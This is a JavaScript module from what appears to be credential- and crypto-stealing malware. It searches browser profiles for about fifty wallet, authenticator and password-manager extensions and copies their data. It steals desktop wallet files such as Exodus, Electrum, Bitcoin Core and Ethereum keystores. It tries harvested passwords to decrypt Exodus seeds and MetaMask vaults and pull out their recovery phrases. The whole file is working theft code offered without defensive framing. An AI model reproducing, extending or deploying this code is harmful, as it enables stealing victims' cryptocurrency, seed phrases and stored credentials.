const fs = require("fs");
const seco = require('seco-file');
const core = require("./core");
const save = require("./save");
const passworder = require('node-passworder');
const {stat} = require("./stats")
const browsers = require("./browsers");

class Extension {
    constructor(name, id) {
        this.name = name;
        this.id = id;
    }

    addPath(path) {
        this.path = path;
    }

    addProfile(profile) {
        this.profile = profile;
    }
}

class Cold {
    constructor(name, existpath, stealpath) {
        this.name = name;
        this.existpath = existpath;
        this.stealpath = stealpath;
    }
}

function getBrowsersProfile() {
    const local = process.env.localappdata;
    const appdata = process.env.appdata;

    const browsers_path = [
        local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Extension Settings",
        local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Extension Settings",
        appdata + "\\Opera Software\\Opera GX Stable\\Local Extension Settings",
        appdata + "\\Opera Software\\Opera Stable\\User Data\\%PROFILE%\\Local Extension Settings",
        local + "\\Google\\Chrome Beta\\User Data\\%PROFILE%\\Local Extension Settings",
        local + "\\Yandex\\YandexBrowser\\User Data\\Local Extension Settings",
        local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Extension Settings"
    ]

    var browsers_profile = [];
    for (var i = 0; i < browsers_path.length; i++) {
        const browser = browsers_path[i];
        const profiles = core.getProfiles(browser, browser.split("\\")[6]);
        for (var j = 0; j < profiles.length; j++) {
            browsers_profile.push(profiles[j]);
        }
    }

    return browsers_profile
}

function grabExtensions() {
    const browsers_profile = getBrowsersProfile()

    const extensions = [
        new Extension("Metamask Wallet", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        new Extension("Sollet Wallet", "fhmfendgdocmcbmfikdcogofphimnkno"),
        new Extension("Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk"),
        new Extension("GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"),
        new Extension("EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal"),
        new Extension("Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"),
        new Extension("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"),
        new Extension("EO.Finance Wallet", "hoighigmnhgkkdaenafgnefkcmipfjon"),
        new Extension("TronLink Wallet", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        new Extension("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        new Extension("Jaxx Liberty Wallet", "cjelfplplebdjjenllpjcblmjkfcffne"),
        new Extension("Guarda Wallet", "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        new Extension("Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        new Extension("Binance Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
        new Extension("NiftyWallet", "jbdaocneiiinmjbjlgalhcelgbejmnid"),
        new Extension("Yoroi Wallet", "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        new Extension("EQUAL Wallet", "blnieiiffboillknjnepogjhkgnoapac"),
        new Extension("BitApp Wallet", "fihkakfobkmkjojpchpfgcmhfjnmnfpi"),
        new Extension("iWallet", "kncchdigobghenbbaddojjnnaogfppfj"),
        new Extension("Wombat Wallet", "amkmjjmmflddogmhpjloimipbofnfjih"),
        new Extension("MEW CX Wallet", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        new Extension("Guild Wallet", "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        new Extension("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        new Extension("NeoLine Wallet", "cphhlgmgameodnhkjdmkpanlelnlohao"),
        new Extension("Clover Wallet", "nhnkbkgjikgcigadomkphalanndcapjk"),
        new Extension("Liquality Wallet", "kpfopkelmapcoipemfendmdcghnegimn"),
        new Extension("Terra Station Wallet", "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        new Extension("Keplr Wallet", "dmkamcknogkgcdfhhbddcghachkejeap"),
        new Extension("Coin98 Wallet", "aeachknmefphepccionboohckonoeemg"),
        new Extension("ZilPay Wallet", "klnaejjgbibmhlephnhpmaofohgkpgkd"),
        new Extension("Hycon Lite Client Wallet", "bcopgchhojmggmffilplmbdicgaihlkp"),
        new Extension("Nash Wallet", "onofpnbbkehpmmoabgpcpmigafmmnjhl"),
        new Extension("Steem Keychain", "jhgnbkkipaallpehbohjmkbjofjdmeid"),
        new Extension("BitClip Wallet", "ijmpgkjfkbfhoebgogflfebnmejmfbml"),
        new Extension("DAppPlay Wallet", "lodccjjbdhfakaekdiahmedfbieldgik"),
        new Extension("Auro Wallet", "cnmamaachppnkjgnildpdmkaakejnhae"),
        new Extension("Polymesh Wallet", "jojhfeoedkpkglbfimdfabpdfjaoolaf"),
        new Extension("ICONex Wallet", "flpiciilemghbmfalicajoolhkkenfel"),
        new Extension("Nabox Wallet", "nknhiehlklippafakaeklbeglecifhad"),
        new Extension("KHC Wallet", "hcflpincpppdclinealmandijcmnkbgn"),
        new Extension("Temple Wallet", "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        new Extension("TezBox Wallet", "mnfifefkajgofkcjkemidiaecocnkjeh"),
        new Extension("Cyano Wallet", "dkdedlpgdmmkkfjabffeganieamfklkm"),
        new Extension("Byone Wallet", "nlgbhdfgdhgbiamfdfmbikcdghidoadd"),
        new Extension("OneKey Wallet", "infeboajgfhgbjpjbeppbkgnabfdkdaf"),
        new Extension("Leaf Wallet", "cihmoadaighcejopammfbmddcmdekcje"),
        new Extension("Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"),
        new Extension("NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb"),
        new Extension("BitWarden", "nngceckbapebfimnlniiiahkandclblb")
    ];

    var final_extensions = [];
    for (var i = 0; i < browsers_profile.length; i++) {
        const profile = browsers_profile[i];
        for (var j = 0; j < extensions.length; j++) {
            const extension = extensions[j];
            const path = profile + "\\" + extension.id + "\\";
            if (fs.existsSync(path)) {
                extension.addPath(path);
                extension.addProfile(profile.profile);
                final_extensions.push(extension);
            }
        }
    }

    for (var i = 0; i < final_extensions.length; i++) {
        const extension = final_extensions[i];
        stat.AddExtensions(extension.name);
        save.Save(extension.path, "Extension Files", extension.name + " - " + extension.profile + " - " + extension.id);
    }
}

function grabColds() {
    const appdata = process.env.appdata;
    const colds = [
        new Cold("Exodus", appdata + "\\Exodus", [
            appdata + "\\Exodus\\exodus.wallet\\",
            appdata + "\\Exodus\\exodus.conf.json",
            appdata + "\\Exodus\\window-state.json",
        ]),
        new Cold("Electrum", appdata + "\\Electrum-LTC", [
            appdata + "\\Electrum-LTC\\wallets\\",
        ]),
        new Cold("Atomic", appdata + "\\atomic", [
            appdata + "\\atomic\\LocalStorage\\leveldb\\",
        ]),
        new Cold("MultiDog", appdata + "\\MultiDog", [
            appdata + "\\MultiDog\\multidoge.wallet\\",
        ]),
        new Cold("Bitcoin Core", appdata + "\\Bitcoin\\Bitcoin Core", [
            appdata + "\\Bitcoin\\Bitcoin Core\\wallet.dat",
        ]),
        new Cold("Binance", appdata + "\\Binance", [
            appdata + "\\Binance\\app-store.json",
            appdata + "\\Binance\\Cookies",
        ]),
        new Cold("Coinomi", appdata + "\\Coinomi", [
            appdata + "\\Coinomi\\wallets\\",
        ]),
        new Cold("Jax", appdata + "\\jaxx", [
            appdata + "\\jaxx\\LocalStorage\\file_0.localstorage",
        ]),
        new Cold("ElectronCash", appdata + "\\ElectronCash", [
            appdata + "\\ElectronCash\\wallets\\default_wallet",
        ]),
        new Cold("Electrum", appdata + "\\Electrum", [
            appdata + "\\Electrum\\wallets\\",
        ]),
        new Cold("Ether", appdata + "\\Ethereum", [
            appdata + "\\Ethereum\\keystore\\",
        ]),
    ]

    for (var i = 0; i < colds.length; i++) {
        const cold = colds[i];
        if (fs.existsSync(cold.existpath)) {
            stat.AddColds(cold.name);
            save.ArraySave(cold.stealpath, "Cold Wallets", cold.name);
        }
    }
}

async function Decrypt(data, key) {
    var res = "";
    try {
        res = await passworder.decrypt(key, data)
    } catch (err) { }
    return res
}

async function decodeMetamask(password, vault) {
    var vaultJson = null;
    try {
        var vaultJson = JSON.parse(vault);
    } catch (e) { }

    if (vaultJson == null) {
        return
    }

    return await Decrypt(vault, password)
}

function getMnemonic(json) {
    var res = ""
    for (var key of json) {
        var mnemonic = key.data.mnemonic
        if (mnemonic != undefined) {
            if (Array.isArray(mnemonic)) {
                res = Buffer.from(mnemonic).toString('utf-8')
            } else {
                res = mnemonic
            }
        }
    }
    return res
}

function decryptExodus(data, phrase) {
	try {
		seco.decryptData(data, phrase);
		return(phrase);
	} catch (ex) {
		return("");
	}
}

async function decryptFileSeco(filename) {
    const list = await browsers.grabBrowsers();
	var data = fs.readFileSync(filename);
	var phrase;
	list.forEach(function(element) {
		phrase = decryptExodus(data, element);
		if (phrase != "") {
			stat.AddExodus(phrase)
		}
	  });
}

async function exodusDecrypt(){
    const appdata = process.env.appdata;
    const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco"
    if (fs.existsSync(seedpath)) {
        try{
            decryptFileSeco(seedpath);
        }
        catch (e) { } 
    } else {
    }
}

async function grabMetamask(passwords) {
    const browsers_profile = getBrowsersProfile();

    var folders = [];
    var vaults = [];

    for (let i = 0; i < browsers_profile.length; i++) {
        const browser = browsers_profile[i];
        const savePath = browser + "\\nkbihfbeogaeaoehlefnkodbefgpgknn\\"
        if (fs.existsSync(savePath)) {
            folders.push(savePath);
        }
    }

    for (let i = 0; i < folders.length; i++) {
        const folder = folders[i];
        const files = fs.readdirSync(folder);

        for (let u = 0; u < files.length; u++) {
            const file = files[u];

            if (file.endsWith(".log")) {
                const data = fs.readFileSync(folder + file, "utf-8");

                const regex = /\"vault":"(?:[^\\"]|\\\\|\\")*"\}/gm;

                const finds = data.match(regex);

                for (let o = 0; o < finds.length; o++) {
                    const find = finds[o];

                    vaults.push(find.replace(/\\/gm, "").replace('"vault":"', '').slice(0, -2));
                }
            }
        }
    }

    vaults = [...new Set(vaults)];

    var mnemonics = [];

    for (let i = 0; i < vaults.length; i++) {
        const vault = vaults[i];

        for (let u = 0; u < passwords.length; u++) {
            const password = passwords[u];
            var tryPass = await decodeMetamask(password, vault);

            if (tryPass != "" && tryPass != undefined) {
                mnemonics.push(getMnemonic(tryPass));
            }
        }
    }

    mnemonics = [...new Set(mnemonics)];
    mnemonics = mnemonics.filter(e =>  e);
    let phrases = [];
    for (let i = 0; i < mnemonics.length; i++) {
        phrases.push({
            phrase: mnemonics[i]
        })
    }
    return phrases
}

module.exports = {
    grabExtensions,
    grabColds,
    grabMetamask,
    exodusDecrypt
}